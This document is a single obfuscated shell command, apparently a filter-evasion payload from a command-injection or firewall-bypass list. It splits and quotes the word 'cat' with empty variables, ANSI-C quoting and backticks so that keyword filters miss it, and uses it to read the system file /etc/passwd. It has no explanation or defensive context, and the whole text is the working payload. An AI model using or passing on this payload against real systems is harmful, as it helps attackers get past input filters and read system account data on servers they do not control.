
    t=;$'c'''$'a'$t''"$t"''`$t`''$'t'  /etc/passwd
    